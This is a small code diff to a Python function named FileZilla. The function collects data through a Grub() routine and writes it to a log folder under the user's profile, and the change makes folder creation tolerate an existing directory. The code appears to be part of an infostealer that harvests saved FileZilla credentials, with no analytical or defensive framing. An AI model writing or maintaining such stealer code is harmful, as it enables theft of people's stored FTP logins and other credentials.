@@ -67,7 +67,7 @@ def FileZilla():
     user = os.environ['USERPROFILE']
     path = f'{user}\\{config.pathToLogs}\\FileZilla'
     try:
-        os.makedirs(path)
+        os.makedirs(path, exist_ok=True)
         data = Grub()
         with open(f"{path}\\data.txt", "w", encoding="utf-8") as f:
             f.write('\n'.join(str(info) for info in data))
